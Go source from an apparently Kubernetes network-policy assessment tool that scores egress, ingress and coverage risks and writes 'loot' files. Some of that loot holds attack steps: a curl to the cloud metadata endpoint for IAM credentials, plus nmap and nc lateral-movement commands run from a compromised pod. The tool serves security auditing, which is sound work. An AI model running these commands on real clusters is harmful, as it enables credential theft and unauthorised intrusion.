	// Calculate final data exfiltration risk
	if risks.AllowsInternet && risks.AllowsAllPorts {
		risks.DataExfiltrationRisk = "CRITICAL"
	} else if risks.AllowsMetadataAPI {
		risks.DataExfiltrationRisk = "HIGH"
	} else if risks.AllowsCloudAPIs {
		risks.DataExfiltrationRisk = "HIGH"
	} else if risks.AllowsInternet && (risks.AllowsDNS || risks.AllowsHTTPS) {
		if risks.DataExfiltrationRisk != "HIGH" && risks.DataExfiltrationRisk != "CRITICAL" {
			risks.DataExfiltrationRisk = "MEDIUM"
		}
	}

	return risks
}

func analyzeDefaultDenyPolicies(ctx context.Context, clientset *kubernetes.Clientset, namespace string) DefaultDenyStatus {
	status := DefaultDenyStatus{
		Namespace:   namespace,
		Recommended: true,
	}

	policies, err := clientset.NetworkingV1().NetworkPolicies(namespace).List(ctx, metav1.ListOptions{})
	if err != nil {
		return status
	}

	for _, policy := range policies.Items {
		// Check for default-deny pattern:
		// 1. Empty pod selector (matches all pods)
		// 2. PolicyTypes specified
		// 3. Empty ingress/egress rules
		if isEmptySelector(&policy.Spec.PodSelector) {
			for _, policyType := range policy.Spec.PolicyTypes {
				if policyType == netv1.PolicyTypeIngress && len(policy.Spec.Ingress) == 0 {
					status.HasIngressDeny = true
					status.IngressDenyPolicies = append(status.IngressDenyPolicies, policy.Name)
				}
				if policyType == netv1.PolicyTypeEgress && len(policy.Spec.Egress) == 0 {
					status.HasEgressDeny = true
					status.EgressDenyPolicies = append(status.EgressDenyPolicies, policy.Name)
				}
			}
		}
	}

	status.HasDefaultDeny = status.HasIngressDeny && status.HasEgressDeny
	status.Recommended = !status.HasDefaultDeny

	if !status.HasIngressDeny {
		status.Recommendations = append(status.Recommendations,
			"Create default-deny ingress policy to block all ingress by default")
	}
	if !status.HasEgressDeny {
		status.Recommendations = append(status.Recommendations,
			"Create default-deny egress policy to block all egress by default")
	}

	return status
}

func analyzeCNIPolicy(item map[string]interface{}, kind string, namespace string) PolicyFinding {
	finding := PolicyFinding{
		Namespace: namespace,
		Name:      getString(item, "metadata", "name"),
		Type:      kind,
		RiskLevel: "LOW", // Default for CNI policies
	}

	var s, t, in, eg string
	switch kind {
	case "CalicoNetworkPolicy":
		s, t, in, eg = parseCalicoPolicy(item)
	case "CiliumNetworkPolicy", "CiliumClusterwideNetworkPolicy":
		s, t, in, eg = parseCiliumPolicy(item)
	case "AntreaNetworkPolicy", "AntreaClusterNetworkPolicy":
		s, t, in, eg = parseAntreaPolicy(item)
	default:
		s, t, in, eg = "<UNKNOWN>", "<UNKNOWN>", "<UNKNOWN>", "<UNKNOWN>"
	}

	finding.PodSelector = s
	finding.PolicyTypes = strings.Split(t, ",")
	finding.IngressRules = in
	finding.EgressRules = eg

	// Simple weakness detection for CNI policies
	if strings.Contains(in, "0.0.0.0/0") || strings.Contains(in, "::/0") {
		finding.Weaknesses = append(finding.Weaknesses, "Allows internet ingress (0.0.0.0/0)")
		finding.IngressAllowsInternet = true
		finding.RiskLevel = "HIGH"
	}
	if strings.Contains(eg, "0.0.0.0/0") || strings.Contains(eg, "::/0") {
		finding.Weaknesses = append(finding.Weaknesses, "Allows internet egress (0.0.0.0/0)")
		finding.EgressAllowsInternet = true
		finding.DataExfiltrationRisk = "HIGH"
		finding.RiskLevel = "HIGH"
	}
	if strings.Contains(eg, "169.254.") {
		finding.Weaknesses = append(finding.Weaknesses, "Allows metadata API access")
		finding.EgressAllowsMetadataAPI = true
		finding.RiskLevel = "HIGH"
	}

	return finding
}

func calculatePolicyRiskLevel(finding PolicyFinding, egressRisk EgressRiskAnalysis) string {
	riskScore := 0

	// CRITICAL FACTORS (50+ points)
	if finding.IngressAllowsInternet && len(finding.IngressDangerousPorts) > 0 {
		riskScore += 100 // Internet access to dangerous ports
	}
	if egressRisk.DataExfiltrationRisk == "CRITICAL" {
		riskScore += 90 // Unrestricted egress
	}
	if finding.EgressAllowsMetadataAPI {
		riskScore += 85 // Metadata API = credential theft
	}
	if finding.HasNoEffect {
		return "LOW" // Ineffective policy = no risk from policy itself
	}
	if finding.IngressAllowsInternet && finding.HasInternetFacingService {
		riskScore += 70 // Internet-facing service with permissive policy
	}

	// HIGH FACTORS (25-40 points)
	if finding.IngressAllowsInternet {
		riskScore += 40 // Internet ingress
	}
	if finding.IngressAllowsAllNS && finding.IngressAllowsAllPods {
		riskScore += 35 // Completely open ingress
	}
	if egressRisk.AllowsCloudAPIs {
		riskScore += 35 // Cloud API access
	}
	if finding.EgressAllowsInternet && egressRisk.AllowsDNS {
		riskScore += 30 // DNS + internet = data exfil
	}
	if len(finding.IngressDangerousPorts) > 0 {
		riskScore += 25 // Dangerous ports exposed
	}

	// MEDIUM FACTORS (10-20 points)
	if finding.IngressAllowsAllPods {
		riskScore += 15 // All pods can connect
	}
	if finding.EgressAllowsAllPorts && finding.EgressAllowsInternet {
		riskScore += 15 // All egress ports to internet
	}
	if finding.IngressAllowsAllNS {
		riskScore += 12 // Cross-namespace access
	}
	if egressRisk.AllowsDNS && egressRisk.AllowsInternet {
		riskScore += 12 // DNS tunneling risk
	}
	if len(finding.Weaknesses) > 3 {
		riskScore += 10 // Multiple weaknesses
	}

	// LOW FACTORS (1-5 points)
	if finding.AllowsLateralMovement {
		riskScore += 5
	}
	if len(finding.MisconfigurationTypes) > 0 {
		riskScore += 3
	}

	// Classify
	if riskScore >= 50 {
		return "CRITICAL"
	} else if riskScore >= 25 {
		return "HIGH"
	} else if riskScore >= 10 {
		return "MEDIUM"
	}
	return "LOW"
}

func calculateCoveredPods(np *netv1.NetworkPolicy, namespacePods []corev1.Pod) int {
	if isEmptySelector(&np.Spec.PodSelector) {
		// Empty selector matches all pods in namespace
		return len(namespacePods)
	}

	selector := labels.Set(np.Spec.PodSelector.MatchLabels).AsSelector()
	count := 0
	for _, pod := range namespacePods {
		if selector.Matches(labels.Set(pod.Labels)) {
			count++
		}
	}
	return count
}

func isPodCoveredByPolicies(pod *corev1.Pod, policies []PolicyFinding) bool {
	for _, policy := range policies {
		if policy.PodSelector == "<NONE>" {
			// Empty selector matches all pods
			return true
		}
		// Simple label matching - in real implementation would need proper selector evaluation
		// For now, if any policy exists, consider it potentially covering the pod
		if policy.CoveredPods > 0 {
			return true
		}
	}
	return false
}

func correlateWithServices(np *netv1.NetworkPolicy, services []corev1.Service) []string {
	var affectedServices []string

	for _, svc := range services {
		if svc.Spec.Selector == nil {
			continue
		}

		// Check if service selector overlaps with policy pod selector
		if selectorsOverlap(np.Spec.PodSelector.MatchLabels, svc.Spec.Selector) {
			affectedServices = append(affectedServices, svc.Name)
		}
	}

	return affectedServices
}

func hasInternetFacingServices(services []corev1.Service, affectedServiceNames []string) bool {
	for _, svc := range services {
		for _, name := range affectedServiceNames {
			if svc.Name == name {
				if svc.Spec.Type == corev1.ServiceTypeLoadBalancer || len(svc.Spec.ExternalIPs) > 0 {
					return true
				}
			}
		}
	}
	return false
}

func selectorsOverlap(selector1, selector2 map[string]string) bool {
	if len(selector1) == 0 || len(selector2) == 0 {
		return true // Empty selector matches everything
	}

	// Check if any labels match
	for k, v := range selector1 {
		if v2, ok := selector2[k]; ok && v == v2 {
			return true
		}
	}
	return false
}

func checkKubeAPIAccess(np *netv1.NetworkPolicy) bool {
	for _, rule := range np.Spec.Egress {
		for _, port := range rule.Ports {
			if port.Port != nil && port.Port.IntVal == 6443 {
				return true
			}
		}
	}
	return false
}

func isNetworkPolicyDefaultDeny(np *netv1.NetworkPolicy) bool {
	if !isEmptySelector(&np.Spec.PodSelector) {
		return false
	}

	// Check if it has policy types but no rules
	hasTypes := len(np.Spec.PolicyTypes) > 0
	noIngressRules := len(np.Spec.Ingress) == 0
	noEgressRules := len(np.Spec.Egress) == 0

	return hasTypes && (noIngressRules || noEgressRules)
}

func isEmptySelector(selector *metav1.LabelSelector) bool {
	return selector == nil ||
		(len(selector.MatchLabels) == 0 && len(selector.MatchExpressions) == 0)
}

// ====================
// Loot Generation
// ====================

func generateLootEntries(finding *PolicyFinding, weaknesses, dataExfil, metadataAPI, internetExposure, dangerousPorts *[]string) {
	// Weaknesses
	if len(finding.Weaknesses) > 0 {
		*weaknesses = append(*weaknesses, fmt.Sprintf("\n### [%s] %s/%s", finding.RiskLevel, finding.Namespace, finding.Name))
		for _, weakness := range finding.Weaknesses {
			*weaknesses = append(*weaknesses, fmt.Sprintf("# - %s", weakness))
		}
		*weaknesses = append(*weaknesses, fmt.Sprintf("kubectl get networkpolicy %s -n %s -o yaml", finding.Name, finding.Namespace))
		*weaknesses = append(*weaknesses, "")
	}

	// Data exfiltration
	if finding.DataExfiltrationRisk == "CRITICAL" || finding.DataExfiltrationRisk == "HIGH" {
		*dataExfil = append(*dataExfil, fmt.Sprintf("\n### [%s] %s/%s - Data Exfil Risk: %s",
			finding.RiskLevel, finding.Namespace, finding.Name, finding.DataExfiltrationRisk))
		if finding.EgressAllowsInternet {
			*dataExfil = append(*dataExfil, "# Allows egress to internet (0.0.0.0/0)")
		}
		if finding.EgressAllowsDNS {
			*dataExfil = append(*dataExfil, "# DNS tunneling possible")
		}
		if finding.EgressAllowsCloudAPIs {
			*dataExfil = append(*dataExfil, "# Cloud API access enabled (AWS/GCP/Azure)")
		}
		*dataExfil = append(*dataExfil, fmt.Sprintf("kubectl get networkpolicy %s -n %s -o yaml", finding.Name, finding.Namespace))
		*dataExfil = append(*dataExfil, "")
	}

	// Metadata API
	if finding.EgressAllowsMetadataAPI {
		*metadataAPI = append(*metadataAPI, fmt.Sprintf("\n### [HIGH] %s/%s", finding.Namespace, finding.Name))
		*metadataAPI = append(*metadataAPI, "# Allows access to cloud metadata API (169.254.169.254)")
		*metadataAPI = append(*metadataAPI, "# Exploitation: Steal cloud credentials from metadata service")
		*metadataAPI = append(*metadataAPI, "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/")
		*metadataAPI = append(*metadataAPI, "")
	}

	// Internet exposure
	if finding.IngressAllowsInternet {
		*internetExposure = append(*internetExposure, fmt.Sprintf("\n### [%s] %s/%s",
			finding.RiskLevel, finding.Namespace, finding.Name))
		*internetExposure = append(*internetExposure, "# Allows ingress from internet (0.0.0.0/0)")
		if finding.HasInternetFacingService {
			*internetExposure = append(*internetExposure, fmt.Sprintf("# Affected services: %s",
				strings.Join(finding.AffectedServices, ", ")))
		}
		*internetExposure = append(*internetExposure, "")
	}

	// Dangerous ports
	if len(finding.IngressDangerousPorts) > 0 {
		*dangerousPorts = append(*dangerousPorts, fmt.Sprintf("\n### [HIGH] %s/%s", finding.Namespace, finding.Name))
		*dangerousPorts = append(*dangerousPorts, "# Exposes dangerous ports:")
		for _, port := range finding.IngressDangerousPorts {
			portName := networkPolicyDangerousPorts[port]
			*dangerousPorts = append(*dangerousPorts, fmt.Sprintf("#   - Port %d (%s)", port, portName))
		}
		*dangerousPorts = append(*dangerousPorts, "")
	}
}

func generateCoverageGapLoot(gap CoverageGap, coverageGaps, lateralMovement *[]string) {
	*coverageGaps = append(*coverageGaps, fmt.Sprintf("\n### [CRITICAL] No Network Policies: %s", gap.Namespace))
	*coverageGaps = append(*coverageGaps, fmt.Sprintf("# %d pods are completely exposed to lateral movement", len(gap.PodsWithoutPolicy)))
	*coverageGaps = append(*coverageGaps, "# Pod list:")
	for _, podName := range gap.PodsWithoutPolicy {
		*coverageGaps = append(*coverageGaps, fmt.Sprintf("#   - %s", podName))
	}
	*coverageGaps = append(*coverageGaps, "")
	*coverageGaps = append(*coverageGaps, "# Exploitation: From any pod in the cluster, you can reach these pods")
	*coverageGaps = append(*coverageGaps, fmt.Sprintf("# Example: kubectl exec -it <any-pod> -- curl http://<pod-ip>:<port>"))
	*coverageGaps = append(*coverageGaps, "")

	// Add to lateral movement loot
	*lateralMovement = append(*lateralMovement, fmt.Sprintf("\n### [CRITICAL] Namespace Without Policies: %s", gap.Namespace))
	*lateralMovement = append(*lateralMovement, fmt.Sprintf("# All %d pods in this namespace accept traffic from anywhere", len(gap.PodsWithoutPolicy)))
	*lateralMovement = append(*lateralMovement, "")
	*lateralMovement = append(*lateralMovement, "# Step 1: Get pod IPs")
	*lateralMovement = append(*lateralMovement, fmt.Sprintf("kubectl get pods -n %s -o wide", gap.Namespace))
	*lateralMovement = append(*lateralMovement, "")
	*lateralMovement = append(*lateralMovement, "# Step 2: From any compromised pod, scan for services")
	*lateralMovement = append(*lateralMovement, "# (Run this inside a compromised pod)")
	*lateralMovement = append(*lateralMovement, "nmap -p 22,80,443,3306,5432,6379,8080,9200,27017 <pod-ip>")
	*lateralMovement = append(*lateralMovement, "")
	*lateralMovement = append(*lateralMovement, "# Step 3: Connect to discovered services")
	*lateralMovement = append(*lateralMovement, "curl http://<pod-ip>:<port>")
	*lateralMovement = append(*lateralMovement, "nc <pod-ip> <port>")
	*lateralMovement = append(*lateralMovement, "")
}

func finalizeLootFiles(coverageGaps, lateralMovement, dataExfil, metadataAPI, defaultDeny *[]string,
	gaps []CoverageGap, totalPolicies int) {

	// Coverage gaps summary
	if len(gaps) > 0 {
		summary := fmt.Sprintf(`
# SUMMARY: Coverage Gap Analysis
# CRITICAL gaps (no policies): %d namespaces
# HIGH gaps (partial coverage): %d namespaces
# Total exposed namespaces: %d
#
# These gaps allow unrestricted lateral movement.
# See detailed exploitation techniques below:
`, countGapsByRisk(gaps, "CRITICAL"), countGapsByRisk(gaps, "HIGH"), len(gaps))

		*coverageGaps = append([]string{summary}, *coverageGaps...)
		*lateralMovement = append([]string{summary}, *lateralMovement...)
	} else {
		*coverageGaps = append(*coverageGaps, "\n# All namespaces have network policies applied.\n# However, review policy rules for overly permissive configurations.\n")
		*lateralMovement = append(*lateralMovement, "\n# All namespaces have network policies.\n# Review individual policy weaknesses above.\n")
	}

	// Data exfiltration summary
	if len(*dataExfil) > 1 {
		*dataExfil = append([]string{fmt.Sprintf("# Total policies analyzed: %d\n# Focus on CRITICAL and HIGH risk policies below\n", totalPolicies)}, *dataExfil...)
	} else {
		*dataExfil = append(*dataExfil, "\n# No critical data exfiltration risks detected.\n# All egress policies appear restrictive.\n")
	}

	// Metadata API summary
	if len(*metadataAPI) > 1 {
		*metadataAPI = append([]string{"# Policies allowing cloud metadata API access enable credential theft\n"}, *metadataAPI...)
	} else {
		*metadataAPI = append(*metadataAPI, "\n# No policies allow metadata API access.\n# This is good security posture.\n")
	}
}

func generateDefaultDenyTemplate(namespace string, status DefaultDenyStatus) string {
	template := fmt.Sprintf(`apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: %s
spec:
  podSelector: {}
  policyTypes:`, namespace)

	if !status.HasIngressDeny {
		template += "\n  - Ingress"
	}
	if !status.HasEgressDeny {
		template += "\n  - Egress"
	}

	return template
}

func buildTableRow(finding PolicyFinding) []string {
	internetIngress := "No"
	if finding.IngressAllowsInternet {
		internetIngress = "Yes"
	}
	internetEgress := "No"
	if finding.EgressAllowsInternet {
		internetEgress = "Yes"
	}
	metadataAPI := "No"
	if finding.EgressAllowsMetadataAPI {
		metadataAPI = "Yes"
	}
	defaultDeny := "No"
	if finding.IsDefaultDeny {
		defaultDeny = "Yes"
	}
	allowsAllNS := "No"
	if finding.IngressAllowsAllNS || finding.EgressAllowsAllNS {
		allowsAllNS = "Yes"
	}
	dangerousPortsStr := "<NONE>"
	if len(finding.IngressDangerousPorts) > 0 {
		var ports []string
		for _, p := range finding.IngressDangerousPorts {
			ports = append(ports, fmt.Sprintf("%d", p))
		}
		dangerousPortsStr = strings.Join(ports, ",")
	}
	servicesStr := "<NONE>"
	if len(finding.AffectedServices) > 0 {
		servicesStr = fmt.Sprintf("%d services", len(finding.AffectedServices))
	}
	lateralMovement := "No"
	if finding.AllowsLateralMovement {
		lateralMovement = "Yes"
	}
	dnsEgress := "No"
	if finding.EgressAllowsDNS {
		dnsEgress = "Yes"
	}
	cloudAPI := "No"
	if finding.EgressAllowsCloudAPIs {
		cloudAPI = "Yes"
	}
	securityIssuesStr := fmt.Sprintf("%d issues", len(finding.SecurityIssues))
	if len(finding.SecurityIssues) == 0 {
		securityIssuesStr = "None"
	}
	weaknessesStr := fmt.Sprintf("%d weaknesses", len(finding.Weaknesses))
	if len(finding.Weaknesses) == 0 {
		weaknessesStr = "None"
	}

	return []string{
		finding.RiskLevel,
		k8sinternal.NonEmpty(finding.Namespace),
		k8sinternal.NonEmpty(finding.Name),
		k8sinternal.NonEmpty(finding.Type),
		fmt.Sprintf("%d", finding.CoveredPods),
		internetIngress,
		internetEgress,
		metadataAPI,
		k8sinternal.NonEmpty(finding.DataExfiltrationRisk),
		defaultDeny,
		allowsAllNS,
		dangerousPortsStr,
		servicesStr,
		lateralMovement,
		dnsEgress,
		cloudAPI,
		securityIssuesStr,
		weaknessesStr,
	}
}

// ====================
// Helper Functions
// ====================

func countGapsByRisk(gaps []CoverageGap, riskLevel string) int {
	count := 0
	for _, gap := range gaps {
		if gap.RiskLevel == riskLevel {
			count++
		}
	}
	return count
}

func formatLabelSelector(selector *metav1.LabelSelector) string {
	if selector == nil || len(selector.MatchLabels) == 0 {
		return "<NONE>"
	}
	var pairs []string
	for k, v := range selector.MatchLabels {
		pairs = append(pairs, fmt.Sprintf("%s=%s", k, v))
	}
	return strings.Join(pairs, ",")
}

func formatPolicyTypes(policyTypes []netv1.PolicyType) string {
	if len(policyTypes) == 0 {
		return "<NONE>"
	}
	var result []string
	for _, pt := range policyTypes {
		result = append(result, string(pt))
	}
	return strings.Join(result, ",")
}

func formatIngressRules(rules []netv1.NetworkPolicyIngressRule) string {
	if len(rules) == 0 {
		return "<NONE>"
	}
	var details []string
	for i, rule := range rules {
		var fromParts []string
		for _, from := range rule.From {
			if from.PodSelector != nil {
				fromParts = append(fromParts, fmt.Sprintf("PodSelector{%s}", formatLabelSelector(from.PodSelector)))
			}
			if from.NamespaceSelector != nil {
				fromParts = append(fromParts, fmt.Sprintf("NSSelector{%s}", formatLabelSelector(from.NamespaceSelector)))
			}
			if from.IPBlock != nil {
				fromParts = append(fromParts, fmt.Sprintf("IPBlock{CIDR:%s, Except:%v}", from.IPBlock.CIDR, from.IPBlock.Except))
			}
		}

		var ports []string
		for _, p := range rule.Ports {
			protocol := "<ANY>"
			if p.Protocol != nil {
				protocol = string(*p.Protocol)
			}
			port := "<ANY>"
			if p.Port != nil {
				port = p.Port.String()
			}
			ports = append(ports, fmt.Sprintf("%s/%s", protocol, port))
		}

		line := fmt.Sprintf("Rule %d: From=[%s], Ports=[%s]", i+1, strings.Join(fromParts, "; "), strings.Join(ports, "; "))
		details = append(details, line)
	}
	return strings.Join(details, "\n")
}

func formatEgressRules(rules []netv1.NetworkPolicyEgressRule) string {
	if len(rules) == 0 {
		return "<NONE>"
	}
	var details []string
	for i, rule := range rules {
		var toParts []string
		for _, to := range rule.To {
			if to.PodSelector != nil {
				toParts = append(toParts, fmt.Sprintf("PodSelector{%s}", formatLabelSelector(to.PodSelector)))
			}
			if to.NamespaceSelector != nil {
				toParts = append(toParts, fmt.Sprintf("NSSelector{%s}", formatLabelSelector(to.NamespaceSelector)))
			}
			if to.IPBlock != nil {
				toParts = append(toParts, fmt.Sprintf("IPBlock{CIDR:%s, Except:%v}", to.IPBlock.CIDR, to.IPBlock.Except))
			}
		}

		var ports []string
		for _, p := range rule.Ports {
			protocol := "<ANY>"
			if p.Protocol != nil {
				protocol = string(*p.Protocol)
			}
			port := "<ANY>"
			if p.Port != nil {
				port = p.Port.String()
			}
			ports = append(ports, fmt.Sprintf("%s/%s", protocol, port))
		}

		line := fmt.Sprintf("Rule %d: To=[%s], Ports=[%s]", i+1, strings.Join(toParts, "; "), strings.Join(ports, "; "))
		details = append(details, line)
	}
	return strings.Join(details, "\n")
}

func parseCalicoPolicy(item map[string]interface{}) (selector, policyTypes, ingress, egress string) {
	spec, ok := item["spec"].(map[string]interface{})
	if !ok {
		return "<NONE>", "<NONE>", "<NONE>", "<NONE>"
	}

	selector = "<NONE>"
	if s, ok := spec["selector"].(string); ok && s != "" {
		selector = s
	}

	types := []string{}
	if _, ok := spec["ingress"]; ok {
		types = append(types, "Ingress")
	}
	if _, ok := spec["egress"]; ok {
		types = append(types, "Egress")
	}
	if len(types) == 0 {
		types = []string{"<NONE>"}
	}
	policyTypes = strings.Join(types, ",")

	ingress = formatGenericRules(spec["ingress"])
	egress = formatGenericRules(spec["egress"])
	return
}

func parseCiliumPolicy(item map[string]interface{}) (selector, policyTypes, ingress, egress string) {
	spec, ok := item["spec"].(map[string]interface{})
	if !ok {
		return "<NONE>", "<NONE>", "<NONE>", "<NONE>"
	}

	selector = "<NONE>"
	if sel, ok := spec["endpointSelector"].(map[string]interface{}); ok {
		if ml, ok := sel["matchLabels"].(map[string]interface{}); ok {
			var parts []string
			for k, v := range ml {
				parts = append(parts, fmt.Sprintf("%s=%s", k, v))
			}
			selector = strings.Join(parts, ",")
		}
	}

	types := []string{}
	if _, ok := spec["ingress"]; ok {
		types = append(types, "Ingress")
	}
	if _, ok := spec["egress"]; ok {
		types = append(types, "Egress")
	}
	if len(types) == 0 {
		types = []string{"<NONE>"}
	}
	policyTypes = strings.Join(types, ",")

	ingress = formatGenericRules(spec["ingress"])
	egress = formatGenericRules(spec["egress"])
	return
}

func parseAntreaPolicy(item map[string]interface{}) (selector, policyTypes, ingress, egress string) {
	spec, ok := item["spec"].(map[string]interface{})
	if !ok {
		return "<NONE>", "<NONE>", "<NONE>", "<NONE>"
	}

	selector = "<NONE>"
	if appliedTo, ok := spec["appliedTo"].([]interface{}); ok {
		var sels []string
		for _, at := range appliedTo {
			if atMap, ok := at.(map[string]interface{}); ok {
				if ps, ok := atMap["podSelector"].(map[string]interface{}); ok {
					var parts []string
					if ml, ok := ps["matchLabels"].(map[string]interface{}); ok {
						for k, v := range ml {
							parts = append(parts, fmt.Sprintf("%s=%s", k, v))
						}
					}
					sels = append(sels, strings.Join(parts, ","))
				}
			}
		}
		if len(sels) > 0 {
			selector = strings.Join(sels, ";")
		}
	}

	types := []string{}
	if _, ok := spec["ingress"]; ok {
		types = append(types, "Ingress")
	}
	if _, ok := spec["egress"]; ok {
		types = append(types, "Egress")
	}
	if len(types) == 0 {
		types = []string{"<NONE>"}
	}
	policyTypes = strings.Join(types, ",")

	ingress = formatGenericRules(spec["ingress"])
	egress = formatGenericRules(spec["egress"])
	return
}

func formatGenericRules(obj interface{}) string {
	if obj == nil {
		return "<NONE>"
	}
	rules, ok := obj.([]interface{})
	if !ok || len(rules) == 0 {
		return "<NONE>"
	}

	var details []string
	for i, r := range rules {
		rule, _ := r.(map[string]interface{})
		var parts []string

		if from, ok := rule["from"].([]interface{}); ok {
			for _, f := range from {
				if fMap, ok := f.(map[string]interface{}); ok {
					if ps, ok := fMap["podSelector"]; ok {
						parts = append(parts, fmt.Sprintf("PodSelector%v", ps))
					}
					if ns, ok := fMap["namespaceSelector"]; ok {
						parts = append(parts, fmt.Sprintf("NSSelector%v", ns))
					}
					if ipb, ok := fMap["ipBlock"]; ok {
						parts = append(parts, fmt.Sprintf("IPBlock%v", ipb))
					}
				}
			}
		}

		if ports, ok := rule["ports"].([]interface{}); ok {
			var portParts []string
			for _, p := range ports {
				if pm, ok := p.(map[string]interface{}); ok {
					proto := "<ANY>"
					if pr, ok := pm["protocol"].(string); ok {
						proto = pr
					}
					port := "<ANY>"
					if po, ok := pm["port"]; ok {
						port = fmt.Sprintf("%v", po)
					}
					portParts = append(portParts, fmt.Sprintf("%s/%s", proto, port))
				}
			}
			parts = append(parts, fmt.Sprintf("Ports=[%s]", strings.Join(portParts, ";")))
		}

		line := fmt.Sprintf("Rule %d: %s", i+1, strings.Join(parts, ", "))
		details = append(details, line)
	}
	return strings.Join(details, "\n")
}

func getString(m map[string]interface{}, keys ...string) string {
	current := m
	for i, key := range keys {
		if i == len(keys)-1 {
			if val, ok := current[key].(string); ok {
				return val
			}
			return ""
		}
		if next, ok := current[key].(map[string]interface{}); ok {
			current = next
		} else {
			return ""
		}
	}
	return ""
}
